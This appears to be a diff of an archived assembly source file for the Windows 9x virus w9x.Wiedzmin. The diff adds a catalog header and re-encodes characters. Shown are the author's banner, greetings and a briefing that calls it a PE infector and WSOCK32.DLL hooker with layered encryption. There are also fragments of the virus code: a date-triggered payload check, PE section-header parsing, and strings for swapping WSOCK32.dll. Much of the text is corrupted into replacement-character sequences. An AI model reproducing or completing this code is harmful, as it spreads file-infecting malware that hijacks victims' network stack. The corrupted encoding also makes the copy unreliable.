@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      Legacy Win9x
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 
 ;
 ;         W                          D                                  nnn
@@ -9,26 +20,26 @@
 ;        wWw  wWwW   iii  eEee  d   dD  zZzZzZ  mm    mm    ii  n    nn
 ;                               ddddDd               mm   iii n      n
 ;             
-;             ã(c) YuP - Deithwen Addan - Artist of Rebelionã      
-;                              ã yup@tlen.pl ã
+;             ï¿½(c) YuP - Deithwen Addan - Artist of Rebelionï¿½      
+;                              ï¿½ yup@tlen.pl ï¿½
 ;                                
-;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                  
-;  Ä      w9x.Wiedzmin       Ä     
-;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                  
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½                                  
+;  ï¿½      w9x.Wiedzmin       ï¿½     
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½                                  
 ;                                                            
 ;               
-;   ÄÄÄÄÄÄÄÄÄÄÄ            
-;  ÄDISCLAIMERÄ             
-;   ÄÄÄÄÄÄÄÄÄÄÄ
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½            
+;  ï¿½ï¿½DISCLAIMERÄ             
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;  This is a source of a virus, only source the compiled version
 ;  cannot leave your computer! Author is NOT RESPONSIBLE FOR ANY
 ;  ACTIONS WITH THIS CODE!               
 ;           
 ;                        
 ;                        
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ            
-;  Ä The name  Ä
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½            
+;  ï¿½ï¿½ The name  Ä
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;              
 ;  The name 'Wiedzmin' was stolen from Andrzej Sapkowski saga "Wiedzmin".
 ;  (sapkowski.pl,sapkowski.cz) - someone said that he is another
@@ -49,55 +60,55 @@
 ;  If you like fantasy you CAN'T miss IT!
 ;  
 ;  
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ            
-;  Ä   Music   Ä
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½            
+;  ï¿½ï¿½   Music   Ä
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;  
 ;   I'd like to thx some kewl music groups in range of rock-hiphop:
 ;   Outsidez:                                Polish groupz: 
-;   æDeep Purple                             æMolesta      
-;   æIron Maiden                             æFenomen
-;   æLinkin Park                             æZipera
-;   æRage Against the Machine                æGrammatik 
-;   æKoRn                                    æEldo
-;   æLimp Bizkit                             æKaliber 44
+;   ï¿½Deep Purple                             ï¿½Molesta      
+;   ï¿½Iron Maiden                             ï¿½Fenomen
+;   ï¿½Linkin Park                             ï¿½Zipera
+;   ï¿½Rage Against the Machine                ï¿½Grammatik 
+;   ï¿½KoRn                                    ï¿½Eldo
+;   ï¿½Limp Bizkit                             ï¿½Kaliber 44
 ;
 ;   I'm a weird person ;] 
 ;                        
 ;
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ            
-;  Ä   Greetz  Ä
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½            
+;  ï¿½ï¿½   Greetz  Ä
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;
 ;   Greetz go to:
-;   æFriendz from city:
-;    ŸYoo             (:])
-;    ŸMisiek          (dzienx za plyty stary)
-;    ŸKlosina         (nie rzucaj nozami)
-;    ŸStra¿ Miejska   (nie trzymamy nog na lawkach :p) 
-;    ŸI dla reszty ludkuf, nie wymienialem was bo i tak
+;   ï¿½Friendz from city:
+;    ï¿½Yoo             (:])
+;    ï¿½Misiek          (dzienx za plyty stary)
+;    ï¿½Klosina         (nie rzucaj nozami)
+;    ï¿½Straï¿½ Miejska   (nie trzymamy nog na lawkach :p) 
+;    ï¿½I dla reszty ludkuf, nie wymienialem was bo i tak
 ;     nigdy tego nie przeczytacie.
 ;
-;   æGuyz from Undernet:
-;    ŸToro           (busy today?)
-;    ŸSlageHammer    (helo tester ;D)
-;    ŸSpanska        (BloodHound.W32.WSWORM ;[) 
-;    ¿BFF70000h      (lagz lagz lagz)
+;   ï¿½Guyz from Undernet:
+;    ï¿½Toro           (busy today?)
+;    ï¿½SlageHammer    (helo tester ;D)
+;    ï¿½Spanska        (BloodHound.W32.WSWORM ;[) 
+;    ï¿½BFF70000h      (lagz lagz lagz)
 ;
-;   æGuyz from irc.pl:
-;    ŸBlaze          (stuk puk)    
-;    ŸDetergent      (walek)
-;    ŸShmastah       (judeIRC ;])
-;    ŸAjron          (ten nie prawdziwy :P)
-;    ŸAamf-girl      (gimnazjalistka ;P)
-;    ŸWizja          (dolly ma reumatyzm czy jakos tak ;>)
-;    ŸPafko          (dragonball rulez!)
-;    ŸCrash          (why you? ;P)
+;   ï¿½Guyz from irc.pl:
+;    ï¿½Blaze          (stuk puk)    
+;    ï¿½Detergent      (walek)
+;    ï¿½Shmastah       (judeIRC ;])
+;    ï¿½Ajron          (ten nie prawdziwy :P)
+;    ï¿½Aamf-girl      (gimnazjalistka ;P)
+;    ï¿½Wizja          (dolly ma reumatyzm czy jakos tak ;>)
+;    ï¿½Pafko          (dragonball rulez!)
+;    ï¿½Crash          (why you? ;P)
 ;     
 ;
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ            
-;  Ä  Briefing Ä
-;   ÄÄÄÄÄÄÄÄÄÄÄÄ
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½            
+;  ï¿½ï¿½  Briefing Ä
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;            
 ;  Virus name        : w9x.Wiedzmin
 ;  Virus version     : 1.0 
@@ -105,14 +116,14 @@
 ;  Release date      : 6.02.02+8.02.02 i forgot to install SEH, he he
 ;  Virus type        : PE infector and WSOCK32.DLL hooker
 ;  Target Systems    : win95<nt>, win98<nt>, winME<t>
-;                      †[nt] - not tested (should work, if not fuck it!)
-;                      †[t]  - tested
+;                      ï¿½[nt] - not tested (should work, if not fuck it!)
+;                      ï¿½[t]  - tested
 ;                                   
 ;                                   
 ;  Encryption        : 3 LAYERS CRYPTED BY RANDOM NUMBER! 
-;                      † 1 - cryptz main virus body †
-;                      † 2 - cryptz host body       †
-;                      † 3 - cryptz virus data      †
+;                      ï¿½ 1 - cryptz main virus body ï¿½
+;                      ï¿½ 2 - cryptz host body       ï¿½
+;                      ï¿½ 3 - cryptz virus data      ï¿½
 ;                      
 ;                      Every layer is crypted by another key.
 ;                                                    
@@ -171,7 +182,7 @@
 ;
 ;
 ;
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WIEDZMIN.ASM]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½[WIEDZMIN.ASM]ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 .386
 .model flat
 jumps                                      
@@ -564,7 +575,7 @@ lea eax,[ebp+SYSTEM_TIME]
 push eax
 call dword ptr [ebp+_GetSystemTime]
 
-cmp word ptr [ebp+wMonth],6          ;22.06 Midaëte
+cmp word ptr [ebp+wMonth],6          ;22.06 Midaï¿½te
 jne try_
 cmp word ptr [ebp+wDay],22
 jne try_
@@ -971,7 +982,7 @@ dec eax                             ;seeking for last,...
 mul ecx                             ;and mul it
 add esi,eax                         ; Normalize
 add esi,78h                         ; Ptr to dir table
-mov edx,[edi+74h]                   ; EDX = n§ of dir entries
+mov edx,[edi+74h]                   ; EDX = nï¿½ of dir entries
 shl edx,3                           ; EDX = EDX*8
 add esi,edx                         ; ESI = Ptr to last section
 
@@ -1438,7 +1449,7 @@ mov ecx,0h                         ;28 bytes for each section header
 
 add esi,ecx                         ; Normalize
 add esi,78h                         ; Ptr to dir table
-mov edx,[edi+74h]                   ; EDX = n§ of dir entries
+mov edx,[edi+74h]                   ; EDX = nï¿½ of dir entries
 shl edx,3                           ; EDX = EDX*8
 add esi,edx                         ; ESI = Ptr to last section
 
@@ -1622,7 +1633,7 @@ dec eax                             ;seeking for last,...
 mul ecx                             ;and mul it
 add esi,eax                         ; Normalize
 add esi,78h                         ; Ptr to dir table
-mov edx,[edi+74h]                   ; EDX = n§ of dir entries
+mov edx,[edi+74h]                   ; EDX = nï¿½ of dir entries
 shl edx,3                           ; EDX = EDX*8
 add esi,edx                         ; ESI = Ptr to last section
 
@@ -2177,16 +2188,16 @@ marker db 'sru.exe',0
 
 
 TO_CRYPT_DATA:  to_ja:      db 0ah,0dh
-                            db "",0ah,0dh
+                            db "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½",0ah,0dh
                             db "<w9x.Wiedzmin (c) -  YuP  - Welcome to new school>",0ah,0dh
-                            db "¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥",0ah,0dh
-                            db "Æ Deithwen Addan Flared Again",0ah,0dh
-                            db "Æ You have eyez, but u can't see",0ah,0dh
-                            db "Æ You have earz, but u can't hear",0ah,0dh
-                            db "Æ Wake up from unreal world before",0ah,0dh
-                            db "Æ you drown in the Sea of Chaos.",0ah,0dh
-                            db "",0ah,0dh
-                            db "¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥",0ah,0dh
+                            db "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½",0ah,0dh
+                            db "ï¿½ Deithwen Addan Flared Again",0ah,0dh
+                            db "ï¿½ You have eyez, but u can't see",0ah,0dh
+                            db "ï¿½ You have earz, but u can't hear",0ah,0dh
+                            db "ï¿½ Wake up from unreal world before",0ah,0dh
+                            db "ï¿½ you drown in the Sea of Chaos.",0ah,0dh
+                            db "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½",0ah,0dh
+                            db "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½",0ah,0dh
                             db 0ah,0dh,0
                  wsock      db "\WSOCK32.dll",0
                  nowe       db "\WZZOCK32.dll",0
